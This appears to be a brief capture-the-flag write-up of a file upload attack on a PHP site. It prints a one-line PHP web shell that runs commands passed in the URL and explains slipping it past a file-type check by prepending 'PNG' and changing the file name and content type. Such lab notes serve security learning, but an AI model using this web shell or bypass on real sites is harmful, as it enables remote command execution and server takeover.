It is given that it is going to be file upload attack.
And using wapalyzer i came to know that the website uses php.
Lets upload a php shell to get access.


<?php system($_GET["cmd"]); ?>

most simple php shell payload.

The website seems to check the first few characters of the file.

Lets add PNG before the payload and upload it. Also change the filename to .php and content type to application/php.
